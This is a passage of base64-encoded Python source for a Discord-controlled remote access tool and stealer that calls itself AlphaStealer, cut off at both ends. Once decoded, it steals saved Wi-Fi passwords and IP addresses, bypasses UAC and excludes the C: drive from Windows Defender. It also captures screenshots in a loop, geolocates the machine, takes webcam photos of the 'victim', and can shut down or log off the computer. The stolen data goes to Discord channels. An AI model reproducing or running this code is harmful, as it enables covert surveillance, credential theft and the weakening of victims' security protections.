HBhc3N3b3JkID0gcGFzc3dvcmRfbWF0Y2guZ3JvdXAoMSkuc3RyaXAoKQ0KICAgICAgICBlbHNlOg0KICAgICAgICAgICAgcGFzc3dvcmQgPSAiTm8iDQoNCiAgICAgICAgZW1iZWQgPSBkaXNjb3JkLkVtYmVkKHRpdGxlPSJXaWZpIEdyYWJiZWQiLCBjb2xvcj0weEZGMDAwMCkNCiAgICAgICAgZW1iZWQuYWRkX2ZpZWxkKG5hbWU9J05hbWU6JywgdmFsdWU9ZidgYGB7c3NpZH1gYGAnKQ0KICAgICAgICBlbWJlZC5hZGRfZmllbGQobmFtZT0nUGFzc3dvcmQ6JywgdmFsdWU9ZidgYGB7cGFzc3dvcmR9YGBgJykNCiAgICAgICAgZW1iZWQuYWRkX2ZpZWxkKG5hbWU9J0lwOicsIHZhbHVlPWYnYGBge2lwfWBgYCcpDQogICAgICAgIGVtYmVkLnNldF9mb290ZXIodGV4dD0nRGV2ZWxvcGVkIEJ5IEFscGhhU3RlYWxlcicpDQoNCiAgICAgICAgaW5mb19jaGFubmVsID0gTm9uZQ0KICAgICAgICBmb3IgY2hhbm5lbCBpbiBjdHguY2hhbm5lbC5jYXRlZ29yeS5jaGFubmVsczoNCiAgICAgICAgICAgIGlmIGNoYW5uZWwubmFtZSA9PSAiaW5mbyI6DQogICAgICAgICAgICAgICAgaW5mb19jaGFubmVsID0gY2hhbm5lbA0KICAgICAgICAgICAgICAgIGJyZWFrDQoNCiAgICAgICAgaWYgaW5mb19jaGFubmVsOg0KICAgICAgICAgICAgYXdhaXQgaW5mb19jaGFubmVsLnNlbmQoZW1iZWQ9ZW1iZWQpDQoNCiAgICBleGNlcHQgRXhjZXB0aW9uIGFzIGU6DQogICAgICAgIGF3YWl0IGN0eC5zZW5kKGYi4p2MIEVycm9yOiB7ZX0iKQ0KDQpAYm90LmNvbW1hbmQobmFtZT0ndWFjYnlwYXNzJykNCkBDaGVja0NhdGVnb3J5DQphc3luYyBkZWYgQWRtaW5CeXBhc3MoY3R4KToNCiAgICBlbWJlZCA9IGRpc2NvcmQuRW1iZWQodGl0bGU9IkNvbW1hbmQgU3VjY2VzcyIsIGRlc2NyaXB0aW9uPSdBZG1pbiBCeXBhc3NlZC4nLCBjb2xvcj0weEZGMDAwMCkNCiAgICBlbWJlZC5zZXRfZm9vdGVyKHRleHQ9J0RldmVsb3BlZCBCeSBBbHBoYVN0ZWFsZXInKQ0KICAgIGF3YWl0IGN0eC5zZW5kKGVtYmVkPWVtYmVkKQ0KICAgIFVBQ2J5cGFzcygpDQogICAgb3Muc3lzdGVtKGYncG93ZXJzaGVsbCAtQ29tbWFuZCBTdGFydC1Qcm9jZXNzIC1GaWxlUGF0aCB7c3lzLmV4ZWN1dGFibGV9JykNCiAgICBib3QuY2xvc2UoKQ0KICAgIHN5cy5leGl0KDEpDQoNCmNhcF9sb29wX3J1bm5pbmcgPSBGYWxzZQ0KY2FwX2xvb3BfdGFzayA9IE5vbmUNCg0KQGJvdC5jb21tYW5kKG5hbWU9J2NhcCcpDQpAQ2hlY2tDYXRlZ29yeQ0KYXN5bmMgZGVmIGNhcChjdHgpOg0KICAgICMgUHJpbWVyIGVtYmVkIGRlIGNvbmZpcm1hY2nDs24NCiAgICBlbWJlZDEgPSBkaXNjb3JkLkVtYmVkKHRpdGxlPSJDb21tYW5kIFN1Y2Nlc3MiLCBkZXNjcmlwdGlvbj0nQ2FwIFNlbnQuJywgY29sb3I9MHhGRjAwMDApDQogICAgZW1iZWQxLnNldF9mb290ZXIodGV4dD0nRGV2ZWxvcGVkIEJ5IEFscGhhU3RlYWxlcicpDQogICAgYXdhaXQgY3R4LnNlbmQoZW1iZWQ9ZW1iZWQxKQ0KDQogICAgIyBDYXB0dXJhIGRlIHBhbnRhbGxhDQogICAgc2NyZWVuc2hvdCA9IHB5YXV0b2d1aS5zY3JlZW5zaG90KCkNCg0KICAgICMgR3VhcmRhciB0ZW1wb3JhbG1lbnRlDQogICAgZmlsZV9wYXRoID0gInNjcmVlbnNob3QucG5nIg0KICAgIHNjcmVlbnNob3Quc2F2ZShmaWxlX3BhdGgpDQoNCiAgICAjIExlZXIgaW1hZ2VuIGVuIGJ5dGVzDQogICAgd2l0aCBvcGVuKGZpbGVfcGF0aCwgInJiIikgYXMgZmlsZToNCiAgICAgICAgaW1hZ2VfYnl0ZXMgPSBmaWxlLnJlYWQoKQ0KDQogICAgIyBCdXNjYXIgZWwgY2FuYWwgJ3NjcmVlbnNob3RzJyBlbiBsYSBtaXNtYSBjYXRlZ29yw61hDQogICAgY2F0ZWdvcnkgPSBjdHguY2hhbm5lbC5jYXRlZ29yeQ0KICAgIGlmIGNhdGVnb3J5Og0KICAgICAgICBzY3JlZW5zaG90X2NoYW5uZWwgPSBkaXNjb3JkLnV0aWxzLmdldChjYXRlZ29yeS50ZXh0X2NoYW5uZWxzLCBuYW1lPSJzY3JlZW5zaG90cyIpDQoNCiAgICAgICAgaWYgc2NyZWVuc2hvdF9jaGFubmVsOg0KICAgICAgICAgICAgZmlsZSA9IGRpc2NvcmQuRmlsZShCeXRlc0lPKGltYWdlX2J5dGVzKSwgZmlsZW5hbWU9InNjcmVlbnNob3QucG5nIikNCiAgICAgICAgICAgIGVtYmVkID0gZGlzY29yZC5FbWJlZCh0aXRsZT0nU2NyZWVuc2hvdCBTdWNjZXNzJywgZGVzY3JpcHRpb249ZiJGZWNoYTogYHtmZWNoYX1gXG5Ib3JhOiBge2hvcmF9YCIsIGNvbG9yPTB4RkYwMDAwKQ0KICAgICAgICAgICAgZW1iZWQuc2V0X2ltYWdlKHVybD0iYXR0YWNobWVudDovL3NjcmVlbnNob3QucG5nIikNCiAgICAgICAgICAgIGVtYmVkLnNldF9mb290ZXIodGV4dD0nRGV2ZWxvcGVkIEJ5IEFscGhhU3RlYWxlcicpDQoNCiAgICAgICAgICAgICMgRW52aWFyIGVtYmVkICsgYXJjaGl2bw0KICAgICAgICAgICAgYXdhaXQgc2NyZWVuc2hvdF9jaGFubmVsLnNlbmQoZW1iZWQ9ZW1iZWQsIGZpbGU9ZmlsZSkNCiAgICANCiAgICAjIEJvcnJhciBhcmNoaXZvIHRlbXBvcmFsDQogICAgb3MucmVtb3ZlKGZpbGVfcGF0aCkNCg0KYXN5bmMgZGVmIGNhcGJ1Y2xlKGN0eCk6DQogICAgc2NyZWVuc2hvdCA9IHB5YXV0b2d1aS5zY3JlZW5zaG90KCkNCg0KICAgICMgR3VhcmRhciB0ZW1wb3JhbG1lbnRlDQogICAgZmlsZV9wYXRoID0gInNjcmVlbnNob3QucG5nIg0KICAgIHNjcmVlbnNob3Quc2F2ZShmaWxlX3BhdGgpDQoNCiAgICAjIExlZXIgaW1hZ2VuIGVuIGJ5dGVzDQogICAgd2l0aCBvcGVuKGZpbGVfcGF0aCwgInJiIikgYXMgZmlsZToNCiAgICAgICAgaW1hZ2VfYnl0ZXMgPSBmaWxlLnJlYWQoKQ0KDQogICAgIyBCdXNjYXIgZWwgY2FuYWwgJ3NjcmVlbnNob3RzJyBlbiBsYSBtaXNtYSBjYXRlZ29yw61hDQogICAgY2F0ZWdvcnkgPSBjdHguY2hhbm5lbC5jYXRlZ29yeQ0KICAgIGlmIGNhdGVnb3J5Og0KICAgICAgICBzY3JlZW5zaG90X2NoYW5uZWwgPSBkaXNjb3JkLnV0aWxzLmdldChjYXRlZ29yeS50ZXh0X2NoYW5uZWxzLCBuYW1lPSJzY3JlZW5zaG90cyIpDQoNCiAgICAgICAgaWYgc2NyZWVuc2hvdF9jaGFubmVsOg0KICAgICAgICAgICAgZmlsZSA9IGRpc2NvcmQuRmlsZShCeXRlc0lPKGltYWdlX2J5dGVzKSwgZmlsZW5hbWU9InNjcmVlbnNob3QucG5nIikNCiAgICAgICAgICAgIGVtYmVkID0gZGlzY29yZC5FbWJlZCh0aXRsZT0nU2NyZWVuc2hvdCBTdWNjZXNzJywgZGVzY3JpcHRpb249ZiJGZWNoYTogYHtmZWNoYX1gXG5Ib3JhOiBge2hvcmF9YCIsIGNvbG9yPTB4RkYwMDAwKQ0KICAgICAgICAgICAgZW1iZWQuc2V0X2ltYWdlKHVybD0iYXR0YWNobWVudDovL3NjcmVlbnNob3QucG5nIikNCiAgICAgICAgICAgIGVtYmVkLnNldF9mb290ZXIodGV4dD0nRGV2ZWxvcGVkIEJ5IEFscGhhU3RlYWxlcicpDQoNCiAgICAgICAgICAgICMgRW52aWFyIGVtYmVkICsgYXJjaGl2bw0KICAgICAgICAgICAgYXdhaXQgc2NyZWVuc2hvdF9jaGFubmVsLnNlbmQoZW1iZWQ9ZW1iZWQsIGZpbGU9ZmlsZSkNCiAgICANCiAgICAjIEJvcnJhciBhcmNoaXZvIHRlbXBvcmFsDQogICAgb3MucmVtb3ZlKGZpbGVfcGF0aCkNCg0KZGVmIGNvdW50X2NhbWVyYXMobWF4X2RldmljZXM9MTApOg0KICAgIGNvdW50ID0gMA0KICAgIGZvciBpIGluIHJhbmdlKG1heF9kZXZpY2VzKToNCiAgICAgICAgY2FwID0gY3YyLlZpZGVvQ2FwdHVyZShpKQ0KICAgICAgICBpZiBjYXAgaXMgTm9uZSBvciBub3QgY2FwLmlzT3BlbmVkKCk6DQogICAgICAgICAgICBjb250aW51ZQ0KICAgICAgICBjb3VudCArPSAxDQogICAgICAgIGNhcC5yZWxlYXNlKCkNCiAgICByZXR1cm4gY291bnQNCg0KQGJvdC5jb21tYW5kKG5hbWU9J2NhcGxvb3AnKQ0KQENoZWNrQ2F0ZWdvcnkNCmFzeW5jIGRlZiBjYXBsb29wKGN0eCk6DQogICAgZ2xvYmFsIGNhcF9sb29wX3J1bm5pbmcsIGNhcF9sb29wX3Rhc2sNCiAgICBpZiBjYXBfbG9vcF9ydW5uaW5nOg0KICAgICAgICBhd2FpdCBjdHguc2VuZCgiWWEgZXhpc3RlIGVsIGJ1Y2xlLiIpDQogICAgICAgIHJldHVybg0KICAgIA0KICAgIGNhcF9sb29wX3J1bm5pbmcgPSBUcnVlDQogICAgZW1iZWQgPSBkaXNjb3JkLkVtYmVkKHRpdGxlPSdDb21tYW5kIFN1Y2NlcycsIGRlc2NyaXB0aW9uPSdCdWNsZSBTdGFydGVkLicsIGNvbG9yPTB4RkYwMDAwKQ0KICAgIGVtYmVkLnNldF9mb290ZXIodGV4dD0nRGV2ZWxvcGVkIEJ5IEFscGhhU3RlYWxlcicpDQogICAgYXdhaXQgY3R4LnNlbmQoZW1iZWQ9ZW1iZWQpDQoNCiAgICBhc3luYyBkZWYgbG9vcF90YXNrKCk6DQogICAgICAgIHdoaWxlIGNhcF9sb29wX3J1bm5pbmc6DQogICAgICAgICAgICBhd2FpdCBjYXBidWNsZShjdHgpDQogICAgICAgICAgICBhd2FpdCBhc3luY2lvLnNsZWVwKDAuMSkNCg0KICAgIGNhcF9sb29wX3Rhc2sgPSBhc3luY2lvLmNyZWF0ZV90YXNrKGxvb3BfdGFzaygpKQ0KDQpAYm90LmNvbW1hbmQobmFtZT0nY2FwbG9vcHN0b3AnKQ0KQENoZWNrQ2F0ZWdvcnkNCmFzeW5jIGRlZiBjYXBzdG9wbG9vcChjdHgpOg0KICAgIGdsb2JhbCBjYXBfbG9vcF9ydW5uaW5nLCBjYXBfbG9vcF90YXNrDQogICAgaWYgbm90IGNhcF9sb29wX3J1bm5pbmc6DQogICAgICAgIGF3YWl0IGN0eC5zZW5kKCJObyBleGlzdGVuIGJ1Y2xlcy4iKQ0KICAgICAgICByZXR1cm4NCg0KICAgIGNhcF9sb29wX3J1bm5pbmcgPSBGYWxzZQ0KICAgIGlmIGNhcF9sb29wX3Rhc2s6DQogICAgICAgIGNhcF9sb29wX3Rhc2suY2FuY2VsKCkNCiAgICAgICAgY2FwX2xvb3BfdGFzayA9IE5vbmUNCiAgICBlbWJlZCA9IGRpc2NvcmQuRW1iZWQodGl0bGU9J0NvbW1hbmQgU3VjY2VzcycsIGRlc2NyaXB0aW9uPSdCdWNsZSBTdG9wcGVkLicsIGNvbG9yPTB4RkYwMDAwKQ0KICAgIGVtYmVkLnNldF9mb290ZXIodGV4dD0nRGV2ZWxvcGVkIEJ5IEFscGhhU3RlYWxlcicpDQogICAgYXdhaXQgY3R4LnNlbmQoZW1iZWQ9ZW1iZWQpDQoNCkBib3QuY29tbWFuZChuYW1lPSdnZW9sb2NhdGUnKQ0KQENoZWNrQ2F0ZWdvcnkNCmFzeW5jIGRlZiBnbGN0KGN0eCk6DQogICAgdXJsID0gZidodHRwczovL2lwaW5mby5pby9qc29uJw0KICAgIA0KICAgIHJlc3BvbnNlID0gcmVxdWVzdHMuZ2V0KHVybCkNCg0KICAgIGlmIHJlc3BvbnNlLnN0YXR1c19jb2RlID09IDIwMDoNCiAgICAgICAgZGF0YSA9IHJlc3BvbnNlLmpzb24oKQ0KDQogICAgICAgIGVtYmVkID0gZGlzY29yZC5FbWJlZCh0aXRsZT0nR2VvbG9jYXRlZCcsIGNvbG9yPTB4RkYwMDAwKQ0KICAgICAgICBlbWJlZC5hZGRfZmllbGQobmFtZT0nSVA6JywgdmFsdWU9ZidgYGB7aXB9YGBgJykNCiAgICAgICAgZW1iZWQuYWRkX2ZpZWxkKG5hbWU9J0NpdWRhZDonLCB2YWx1ZT1mJ2BgYHtkYXRhWyJjaXR5Il19YGBgJykNCiAgICAgICAgZW1iZWQuYWRkX2ZpZWxkKG5hbWU9J1BhaXM6JywgdmFsdWU9ZidgYGB7ZGF0YVsiY291bnRyeSJdfWBgYCcpDQogICAgICAgIGVtYmVkLmFkZF9maWVsZChuYW1lPSdPcmdhbml6YXRpb246JywgdmFsdWU9ZidgYGB7ZGF0YVsib3JnIl19YGBgJykNCiAgICAgICAgZW1iZWQuYWRkX2ZpZWxkKG5hbWU9J0NvZGUgUG9zdGFsOicsIHZhbHVlPWYnYGBge2RhdGFbInBvc3RhbCJdfWBgYCcpDQogICAgICAgIGVtYmVkLmFkZF9maWVsZChuYW1lPSdDb29yZHM6JywgdmFsdWU9ZidgYGB7ZGF0YVsibG9jIl19YGBgJykNCiAgICAgICAgZW1iZWQuYWRkX2ZpZWxkKG5hbWU9J0hvc3RuYW1lOicsIHZhbHVlPWYnYGBge2RhdGFbImhvc3RuYW1lIl19YGBgJykNCg0KICAgICAgICBlbWJlZC5zZXRfZm9vdGVyKHRleHQ9J0RldmVsb3BlZCBCeSBBbHBoYVN0ZWFsZXInKQ0KDQogICAgICAgIGluZm9fY2hhbm5lbCA9IE5vbmUNCiAgICAgICAgZm9yIGNoYW5uZWwgaW4gY3R4LmNoYW5uZWwuY2F0ZWdvcnkuY2hhbm5lbHM6DQogICAgICAgICAgICBpZiBjaGFubmVsLm5hbWUgPT0gImluZm8iOg0KICAgICAgICAgICAgICAgIGluZm9fY2hhbm5lbCA9IGNoYW5uZWwNCiAgICAgICAgICAgICAgICBicmVhaw0KDQogICAgICAgIGlmIGluZm9fY2hhbm5lbDoNCiAgICAgICAgICAgIGF3YWl0IGluZm9fY2hhbm5lbC5zZW5kKGVtYmVkPWVtYmVkKQ0KDQogICAgZWxzZToNCiAgICAgICAgcGFzcw0KDQpAYm90LmNvbW1hbmQobmFtZT0nc2h1dGRvd24nKQ0KQENoZWNrQ2F0ZWdvcnkNCmFzeW5jIGRlZiBzaHV0ZG93bihjdHgpOg0KICAgIGVtYmVkID0gZGlzY29yZC5FbWJlZCh0aXRsZT0nQ29tbWFuZCBTdWNjZXNzJywgZGVzY3JpcHRpb249J1ZpY3RpbSBDb21wdXRlciBTaG93ZG93bmVkLicsIGNvbG9yPTB4RkYwMDAwKQ0KICAgIGVtYmVkLnNldF9mb290ZXIodGV4dD0nRGV2ZWxvcGVkIEJ5IEFscGhhU3RlYWxlcicpDQogICAgYXdhaXQgY3R4LnNlbmQoZW1iZWQ9ZW1iZWQpDQogICAgc3VicHJvY2Vzcy5ydW4oc2h1dGRvd25fY21kLCBzaGVsbD1UcnVlKQ0KDQpAYm90LmNvbW1hbmQobmFtZT0ncmVzdGFydCcpDQpAQ2hlY2tDYXRlZ29yeQ0KYXN5bmMgZGVmIHJlc3RhcnQoY3R4KToNCiAgICBlbWJlZCA9IGRpc2NvcmQuRW1iZWQodGl0bGU9J0NvbW1hbmQgU3VjY2VzcycsIGRlc2NyaXB0aW9uPSdWaWN0aW0gQ29tcHV0ZXIgUmVzdGFydGVkLicsIGNvbG9yPTB4RkYwMDAwKQ0KICAgIGVtYmVkLnNldF9mb290ZXIodGV4dD0nRGV2ZWxvcGVkIEJ5IEFscGhhU3RlYWxlcicpDQogICAgYXdhaXQgY3R4LnNlbmQoZW1iZWQ9ZW1iZWQpDQogICAgc3VicHJvY2Vzcy5ydW4oc2h1dGRvd25fY21kLCBzaGVsbD1UcnVlKQ0KDQpAYm90LmNvbW1hbmQobmFtZT0nbG9nb2ZmJykNCkBDaGVja0NhdGVnb3J5DQphc3luYyBkZWYgbG9nb2ZmKGN0eCk6DQogICAgZW1iZWQgPSBkaXNjb3JkLkVtYmVkKHRpdGxlPSdDb21tYW5kIFN1Y2Nlc3MnLCBkZXNjcmlwdGlvbj0nU2Vzc2lvbiBDbG9zZWQuJywgY29sb3I9MHhGRjAwMDApDQogICAgZW1iZWQuc2V0X2Zvb3Rlcih0ZXh0PSdEZXZlbG9wZWQgQnkgQWxwaGFTdGVhbGVyJykNCiAgICBhd2FpdCBjdHguc2VuZChlbWJlZD1lbWJlZCkNCiAgICBzdWJwcm9jZXNzLnJ1bihzaHV0ZG93bl9jbWQsIHNoZWxsPVRydWUpDQoNCkRFY29tbWFuZCA9ICdBZGQtTXBQcmVmZXJlbmNlIC1FeGNsdXNpb25QYXRoICJDOlxcIicNCg0KQGJvdC5jb21tYW5kKG5hbWU9J2RlZmVuZGVyZXhjbHVzaW9uJykNCkBDaGVja0NhdGVnb3J5DQphc3luYyBkZWYgRGVmZW5kZXJFeGNsdXNpb24oY3R4KToNCiAgICBlbWJlZCA9IGRpc2NvcmQuRW1iZWQodGl0bGU9J0NvbW1hbmQgU3VjY2VzcycsIGRlc2NyaXB0aW9uPSdUaGUgQzpcIHBhcnRpdGlvbiBpcyBhZGRlZCB0byBleGNsdXNpb25zJywgY29sb3I9MHhGRjAwMDApDQogICAgZW1iZWQuc2V0X2Zvb3Rlcih0ZXh0PSdEZXZlbG9wZWQgQnkgQWxwaGFTdGVhbGVyJykNCiAgICBhd2FpdCBjdHguc2VuZChlbWJlZD1lbWJlZCkNCiAgICBzdWJwcm9jZXNzLnJ1bihbInBvd2Vyc2hlbGwiLCAiLUNvbW1hbmQiLCBERWNvbW1hbmRdLCBzaGVsbD1UcnVlKQ0KDQpkZWYgaGFuZGxlX2luZm9tc2coY3R4LCB0aXRsZSwgbWVzc2FnZSk6DQogICAgY3R5cGVzLndpbmRsbC51c2VyMzIuTWVzc2FnZUJveFcoMCwgbWVzc2FnZSwgdGl0bGUsIDB4MCB8IDB4NDApDQogICAgZnV0ID0gZGlzY29yZC51dGlscy5ydW5fY29yb3V0aW5lX3RocmVhZHNhZmUoYm90Lmxvb3ApDQogICAgZnV0LnJlc3VsdCgpDQoNCmRlZiBoYW5kbGVfd2Fybm1zZyhjdHgsIHRpdGxlLCBtZXNzYWdlKToNCiAgICBjdHlwZXMud2luZGxsLnVzZXIzMi5NZXNzYWdlQm94VygwLCBtZXNzYWdlLCB0aXRsZSwgMHgwIHwgMHgzMCkNCiAgICBmdXQgPSBkaXNjb3JkLnV0aWxzLnJ1bl9jb3JvdXRpbmVfdGhyZWFkc2FmZShib3QubG9vcCkNCiAgICBmdXQucmVzdWx0KCkNCg0KZGVmIGhhbmRsZV9lcnJvcm1zZyhjdHgsIHRpdGxlLCBtZXNzYWdlKToNCiAgICBjdHlwZXMud2luZGxsLnVzZXIzMi5NZXNzYWdlQm94VygwLCBtZXNzYWdlLCB0aXRsZSwgMHgwIHwgMHgxMCkNCiAgICBmdXQgPSBkaXNjb3JkLnV0aWxzLnJ1bl9jb3JvdXRpbmVfdGhyZWFkc2FmZShib3QubG9vcCkNCiAgICBmdXQucmVzdWx0KCkNCg0KZGVmIGhhbmRsZV9xdWVzdGlvbm1zZyhjdHgsIHRpdGxlLCBtZXNzYWdlKToNCiAgICBjdHlwZXMud2luZGxsLnVzZXIzMi5NZXNzYWdlQm94VygwLCBtZXNzYWdlLCB0aXRsZSwgMHgwIHwgMHgyMCkNCiAgICBmdXQgPSBkaXNjb3JkLnV0aWxzLnJ1bl9jb3JvdXRpbmVfdGhyZWFkc2FmZShib3QubG9vcCkNCiAgICBmdXQucmVzdWx0KCkNCg0KQGJvdC5jb21tYW5kKG5hbWU9J2luZm9tc2cnKQ0KQENoZWNrQ2F0ZWdvcnkNCmFzeW5jIGRlZiBpbmZvbXNnKGN0eCwgdGl0bGU6IHN0ciwgKiwgbWVzc2FnZTogc3RyKToNCiAgICBlbWJlZCA9IGRpc2NvcmQuRW1iZWQodGl0bGU9J0NvbW1hbmQgU3VjY2VzcycsIGRlc2NyaXB0aW9uPSdNZXNzYWdlIEJveCBTZW50LicsIGNvbG9yPTB4RkYwMDAwKQ0KICAgIGVtYmVkLnNldF9mb290ZXIodGV4dD0nRGV2ZWxvcGVkIEJ5IEFscGhhU3RlYWxlcicpDQogICAgYXdhaXQgY3R4LnNlbmQoZW1iZWQ9ZW1iZWQpDQogICAgdGhyZWFkaW5nLlRocmVhZCh0YXJnZXQ9aGFuZGxlX2luZm9tc2csIGFyZ3M9KGN0eCwgdGl0bGUsIG1lc3NhZ2UpLCBkYWVtb249VHJ1ZSkuc3RhcnQoKQ0KDQpAYm90LmNvbW1hbmQobmFtZT0nd2Fybm1zZycpDQpAQ2hlY2tDYXRlZ29yeQ0KYXN5bmMgZGVmIHdhcm5tc2coY3R4LCB0aXRsZTogc3RyLCAqLCBtZXNzYWdlOiBzdHIpOg0KICAgIGVtYmVkID0gZGlzY29yZC5FbWJlZCh0aXRsZT0nQ29tbWFuZCBTdWNjZXNzJywgZGVzY3JpcHRpb249J01lc3NhZ2UgQm94IFNlbnQuJywgY29sb3I9MHhGRjAwMDApDQogICAgZW1iZWQuc2V0X2Zvb3Rlcih0ZXh0PSdEZXZlbG9wZWQgQnkgQWxwaGFTdGVhbGVyJykNCiAgICBhd2FpdCBjdHguc2VuZChlbWJlZD1lbWJlZCkNCiAgICB0aHJlYWRpbmcuVGhyZWFkKHRhcmdldD1oYW5kbGVfd2Fybm1zZywgYXJncz0oY3R4LCB0aXRsZSwgbWVzc2FnZSksIGRhZW1vbj1UcnVlKS5zdGFydCgpDQoNCkBib3QuY29tbWFuZChuYW1lPSdlcnJvcm1zZycpDQpAQ2hlY2tDYXRlZ29yeQ0KYXN5bmMgZGVmIGVycm9ybXNnKGN0eCwgdGl0bGU6IHN0ciwgKiwgbWVzc2FnZTogc3RyKToNCiAgICBlbWJlZCA9IGRpc2NvcmQuRW1iZWQodGl0bGU9J0NvbW1hbmQgU3VjY2VzcycsIGRlc2NyaXB0aW9uPSdNZXNzYWdlIEJveCBTZW50LicsIGNvbG9yPTB4RkYwMDAwKQ0KICAgIGVtYmVkLnNldF9mb290ZXIodGV4dD0nRGV2ZWxvcGVkIEJ5IEFscGhhU3RlYWxlcicpDQogICAgYXdhaXQgY3R4LnNlbmQoZW1iZWQ9ZW1iZWQpDQogICAgdGhyZWFkaW5nLlRocmVhZCh0YXJnZXQ9aGFuZGxlX2Vycm9ybXNnLCBhcmdzPShjdHgsIHRpdGxlLCBtZXNzYWdlKSwgZGFlbW9uPVRydWUpLnN0YXJ0KCkNCg0KQGJvdC5jb21tYW5kKG5hbWU9J3F1ZXN0aW9ubXNnJykNCkBDaGVja0NhdGVnb3J5DQphc3luYyBkZWYgcXVlc3Rpb25tc2coY3R4LCB0aXRsZTogc3RyLCAqLCBtZXNzYWdlOiBzdHIpOg0KICAgIGVtYmVkID0gZGlzY29yZC5FbWJlZCh0aXRsZT0nQ29tbWFuZCBTdWNjZXNzJywgZGVzY3JpcHRpb249J01lc3NhZ2UgQm94IFNlbnQuJywgY29sb3I9MHhGRjAwMDApDQogICAgZW1iZWQuc2V0X2Zvb3Rlcih0ZXh0PSdEZXZlbG9wZWQgQnkgQWxwaGFTdGVhbGVyJykNCiAgICBhd2FpdCBjdHguc2VuZChlbWJlZD1lbWJlZCkNCiAgICB0aHJlYWRpbmcuVGhyZWFkKHRhcmdldD1oYW5kbGVfcXVlc3Rpb25tc2csIGFyZ3M9KGN0eCwgdGl0bGUsIG1lc3NhZ2UpLCBkYWVtb249VHJ1ZSkuc3RhcnQoKQ0KICAgIA0KQGJvdC5jb21tYW5kKG5hbWU9J2dldGNhbXMnKQ0KQENoZWNrQ2F0ZWdvcnkNCmFzeW5jIGRlZiBnZXRjYW1zKGN0eCk6DQogICAgY2FtcyA9IGNvdW50X2NhbWVyYXMoKQ0KICAgIGVtYmVkID0gZGlzY29yZC5FbWJlZCh0aXRsZT0iV2ViY2FtJ3MgRGV0ZWN0ZWQiLCBkZXNjcmlwdGlvbj1mIlRoZXJlIGFyZSBge2NhbXN9YCB3ZWJjYW0ncy4iLCBjb2xvcj0weEZGMDAwMCkgDQogICAgZW1iZWQuc2V0X2Zvb3Rlcih0ZXh0PSdEZXZlbG9wZWQgQnkgQWxwaGFTdGVhbGVyJykNCg0KICAgIGF3YWl0IGN0eC5zZW5kKGVtYmVkPWVtYmVkKQ0KDQp1c2VyX2NhbWVyYXMgPSB7fQ0KDQpAYm90LmNvbW1hbmQobmFtZT0nc2V0Y2FtJykNCmFzeW5jIGRlZiBzZXRjYW0oY3R4LCBjYW1faW5kZXg6IGludCk6DQogICAgaWYgY2FtX2luZGV4IDwgMDoNCiAgICAgICAgcmV0dXJuDQogICAgDQogICAgY2FtID0gY3YyLlZpZGVvQ2FwdHVyZShjYW1faW5kZXgpDQoNCiAgICBpZiBub3QgY2FtLmlzT3BlbmVkKCk6DQogICAgICAgIGF3YWl0IGN0eC5zZW5kKGYiQ291bGQgbm90IG9wZW4gY2FtZXJhIGB7Y2FtX2luZGV4fWAuIikNCiAgICAgICAgcmV0dXJuDQogICAgDQogICAgdXNlcl9jYW1lcmFzW2N0eC5hdXRob3IuaWRdID0gY2FtX2luZGV4DQogICAgZW1iZWQgPSBkaXNjb3JkLkVtYmVkKHRpdGxlPSdDb21tYW5kIFN1Y2Nlc3MnLCBkZXNjcmlwdGlvbj1mJ1dlYmNhbSBTZWxlY3RlZCBge2NhbV9pbmRleH1gLicsIGNvbG9yPTB4RkYwMDAwKQ0KICAgIGVtYmVkLnNldF9mb290ZXIodGV4dD0nRGV2ZWxvcGVkIEJ5IEFscGhhU3RlYWxlcicpDQogICAgYXdhaXQgY3R4LnNlbmQoZW1iZWQ9ZW1iZWQpDQoNCkBib3QuY29tbWFuZChuYW1lPSdwaG90b2NhbScpDQphc3luYyBkZWYgcGhvdG9jYW0oY3R4KToNCiAgICBhd2FpdCBwcm9jZXNzX3Bob3RvY2FtKGN0eCkNCg0KQGJvdC5jb21tYW5kKG5hbWU9J3ZpZGVvY2FtJykNCmFzeW5jIGRlZiB2aWRlb2NhbShjdHgpOg0KICAgIGF3YWl0IHByb2Nlc3NfdmlkZW9jYW0oY3R4KQ0KDQphc3luYyBkZWYgcHJvY2Vzc19waG90b2NhbShjdHgpOg0KICAgIGVtYmVkID0gZGlzY29yZC5FbWJlZCh0aXRsZT0nQ29tbWFuZCBTdWNjZXNzJywgZGVzY3JpcHRpb249J01ha2luZyBwaG90byB3aXRoIHRoZSB2aWN0aW0gd2ViY2FtLicsIGNvbG9yPTB4RkYwMDAwKQ0KICAgIGVtYmVkLnNldF9mb290ZXIodGV4dD0nRGV2ZWxvcGVkIEJ5IEFscGhhU3RlYWxlcicpDQoNCiAgICB0cnk6DQogICAgICAgIGF3YWl0IGN0eC5zZW5kKGVtYmVkPWVtYmVkKQ0KICAgIGV4Y2VwdCBkaXNjb3JkLmVycm9ycy5IVFRQRXhjZXB0aW9uOg0KICAgICAgICBwYXNzDQoNCiAgICBpZiBjdHguYXV0aG9yLmlkIG5vdCBpbiB1c2VyX2NhbWVyYXM6DQogICAgICAgIHJldHVybg0KDQogICAgY2FtX2luZGV4ID0gdXNlcl9jYW1lcmFzW2N0eC5hdXRob3IuaWRdDQogICAgY2FtID0gY3YyLlZpZGVvQ2FwdHVyZShjYW1faW5kZXgpDQoNCiAgICBpZiBub3QgY2FtLmlzT3BlbmVkKCk6DQogICAgICAgIHJldHVybg0KDQogICAgcmV0LCBmcmFtZSA9IGNhbS5yZWFkKCkNCiAgICBpZiByZXQ6DQogICAgICAgIGZpbGVuYW1lID0gInBob3RvLmpwZyINCiAgICAgICAgY3YyLmltd3JpdGUoZmlsZW5hbWUsIGZyYW1lKQ0KICAgICAgICBjYW0ucmVsZWFzZSgpDQoNCiAgICAgICAgd2l0aCBvcGVuKGZpbGVuYW1lLCAicmIiKSBhcyBmOg0KICAgICAgICAgICAgcGljdHVyZSA9IGRpc2NvcmQuRmlsZShmLCBmaWxlbmFtZT0icGhvdG8uanBnIikNCg0KICAgICAgICAgICAgIyBCdXNjYSBlbCBjYW5hbCAnd2ViY2FtJyBkZW50cm8gZGUgbGEgY2F0ZWdvcsOtYQ0KICAgICAgICAgICAgd2ViY2FtX2NoYW5uZWwgPSBOb25lDQogICAgICAgICAgICBmb3IgY2hhbm5lbCBpbiBjdHguY2hhbm5lbC5jYXRlZ29yeS5jaGFubmVsczoNCiAgICAgICAgICAgICAgICBpZiBjaGFubmVsLm5hbWUgPT0gJ3dlYmNhbSc6DQogICAgICAgICAgICAgICAgICAgIHdlYmNhbV9jaGFubmVsID0gY2hhbm5lbA0KICAgICAgICAgICAgICAgICAgICBicmVhaw0KDQogICAgICAgICAgICBub3cgPSBkYXRldGltZS5